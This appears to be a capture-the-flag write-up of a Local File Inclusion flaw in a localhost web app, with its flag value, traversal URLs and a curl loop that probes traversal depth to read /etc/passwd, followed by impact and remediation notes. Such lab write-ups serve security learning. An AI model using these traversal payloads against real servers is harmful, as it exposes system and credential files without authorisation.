# Local File Inclusion (LFI) - Detection Process

## Vulnerability Detected

The web application contains a **Local File Inclusion (LFI)** vulnerability that allows reading arbitrary files on the server.

## Detection Process

### 1. Attack Vector Identification

While analyzing the application, we identified a suspicious GET parameter in the URL:
```
http://localhost:8080/index.php?page=<value>
```

The `page` parameter appears to be used for dynamic file inclusion.

### 2. Initial Path Traversal Test

We attempted to access a sensitive system file (`/etc/passwd`) using the **path traversal** technique with `../` sequences:

```
http://localhost:8080/index.php?page=/../../../../../../../etc/passwd
```

### 3. Automation to Determine Required Depth

To find the exact number of directory traversals (`../`) needed, we used an automated script:

```bash
for i in {0..8}; do
    curl -s "http://localhost:8080/index.php?page=$(printf '../%.0s' $(seq 1 $i))etc/passwd" | head -3
done
```

### 4. Response Analysis

The server returned different JavaScript alerts depending on the depth:
- `0-5 traversals`: Various error messages ("Wtf ?", "Wrong..", "Nope..", "Almost.", "Still nope..")
- `6 traversals`: **"Nope.."**
- `7 traversals`: **"Congratulaton!! The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0"**
- `8 traversals`: Same result as 7

### 5. Successful Exploitation

Exploitation with **7 `../` sequences** successfully reached the `/etc/passwd` file and triggered the validation:

```
http://localhost:8080/index.php?page=../../../../../../../etc/passwd
```

## Vulnerability Impact

This vulnerability allows an attacker to:
- Read sensitive system files (`/etc/passwd`, `/etc/shadow`, etc.)
- Access application configuration files
- Potentially discover critical information (credentials, API keys, etc.)
- Exfiltrate application source code

## Recommendations

1. **Strict input validation**: Whitelist accepted values for the `page` parameter
2. **Path traversal sanitization**: Use `basename()` or `realpath()` to eliminate `../` sequences
3. **Chroot or access restriction**: Limit file access to a specific directory
4. **Avoid dynamic inclusion**: Use a secure routing system instead of directly including files based on user parameters

### Sources
OWASP
Claude

